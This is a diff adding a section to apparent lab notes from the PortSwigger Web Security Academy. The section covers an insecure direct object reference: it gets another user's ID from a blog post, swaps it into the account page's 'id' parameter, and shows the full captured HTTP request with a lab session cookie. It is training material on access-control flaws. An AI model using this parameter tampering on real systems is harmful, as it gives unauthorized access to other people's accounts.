@@ -234,5 +234,41 @@ If the target user is an application administrator, then the attacker will gain 
      GET /my-account?id=asif HTTP/1.1
 
 
+## 4. User ID controlled by request parameter, with unpredictable user IDs
 
+   Find a blog post by carlos.
+   
+   Click on carlos and observe that the URL contains his user ID. Make a note of this ID.
+   
+   Change the "id" parameter to the saved user ID. 
+   
+   Accept the request, This is vulnerable
+   
+ ## Request 
+ 
+    GET /my-account?id=62cae48d-fa7e-43a1-810a-8d3edcb5b449 HTTP/1.1
+Host: 0a300096047fe477c0d9261500590058.web-security-academy.net
+Cookie: session=wW0hPlgsA25dMoB1jfIJCvY7PiK38r0l
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0a300096047fe477c0d9261500590058.web-security-academy.net/my-account
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
